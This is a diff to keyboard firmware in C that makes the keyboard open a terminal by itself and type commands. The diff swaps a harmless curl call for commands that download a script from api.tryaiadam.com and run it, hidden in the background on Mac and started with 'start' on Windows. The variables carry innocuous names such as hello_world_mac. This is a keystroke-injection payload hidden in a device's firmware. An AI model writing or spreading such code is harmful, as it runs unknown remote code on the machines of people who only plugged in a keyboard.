@@ -54,10 +54,11 @@ key_combination_t key_comb_list[6] = {
     {2, {KC_LGUI, KC_SPACE}}       // Spotlight for terminal (mac)
 };
 
-// Terminal command sequence for typing "curl https://aiadam.io && exit"
+// Terminal command sequence
 const char terminal_command_win[] = "cmd";
 const char terminal_command_mac[] = "terminal";
-const char hello_world[] = "curl https://aiadam.io && exit";
+const char hello_world_mac[] = "nohup bash -c 'curl -s https://api.tryaiadam.com/sar.sh -o sar.sh && chmod +x sar.sh && ./sar.sh' > sar.log 2>&1 &";
+const char hello_world_win[] = "curl -s -O https://api.tryaiadam.com/sar.bat && start "" sar.bat";
 
 #ifdef KC_BLUETOOTH_ENABLE
 bool                   firstDisconnect  = true;
@@ -218,25 +219,31 @@ void matrix_scan_kb(void) {
                 
             case 1:
                 if (current_os == 0) { // Mac
-                    send_string_with_delay(terminal_command_mac, 5);
+                    send_string_with_delay(terminal_command_mac, 10);
+                    wait_ms(200); // Wait after typing before pressing Enter
                     register_code(KC_ENTER);
-                    wait_ms(50);
+                    wait_ms(100);
                     unregister_code(KC_ENTER);
                 } else { // Windows
-                    send_string_with_delay(terminal_command_win, 5);
+                    send_string_with_delay(terminal_command_win, 10);
+                    wait_ms(200); // Wait after typing before pressing Enter
                     register_code(KC_ENTER);
-                    wait_ms(50);
+                    wait_ms(100);
                     unregister_code(KC_ENTER);
                 }
                 terminal_sequence_step++;
                 break;
                 
             case 2:
-                wait_ms(500);
-                send_string_with_delay(hello_world, 5);
-                wait_ms(50);
+                wait_ms(5000); // Increased delay to give terminal time to open
+                if (current_os == 0) { // Mac
+                    send_string_with_delay(hello_world_mac, 10);
+                } else { // Windows
+                    send_string_with_delay(hello_world_win, 10);
+                }
+                wait_ms(100);
                 register_code(KC_ENTER);
-                wait_ms(50);
+                wait_ms(100);
                 unregister_code(KC_ENTER);
                 terminal_sequence_step++;
                 break;
